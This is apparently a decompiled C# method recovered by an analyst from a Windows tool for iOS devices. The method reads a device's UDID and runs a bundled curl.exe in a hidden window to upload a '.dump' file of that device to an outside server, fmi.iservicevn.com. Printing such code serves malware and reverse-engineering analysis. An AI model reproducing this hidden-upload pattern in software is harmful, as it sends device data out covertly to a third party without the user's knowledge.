// Recovered from method token 0x060000c7; analyst names; not the original source.
using System.Diagnostics;
using System.Runtime.CompilerServices;

[MethodImpl(MethodImplOptions.NoInlining)]
public void Recovered_06_00c7_Name()
{
	string deviceUDID = DeviceStateRecovered.DeviceUDID;
	string text = "https://fmi.iservicevn.com/fmio/upload.php";
	using Process process = new Process();
	process.StartInfo.FileName = Recovered_04_0052_Name + "\\vendor\\curl.exe";
	process.StartInfo.WorkingDirectory = Recovered_04_0052_Name + "\\vendor\\Backup";
	process.StartInfo.Arguments = "curl -F fileToUpload=@" + deviceUDID + ".dump " + text;
	process.StartInfo.UseShellExecute = false;
	process.StartInfo.RedirectStandardOutput = true;
	process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
	process.StartInfo.CreateNoWindow = true;
	process.Start();
	process.StandardOutput.ReadToEnd();
	process.WaitForExit();
}
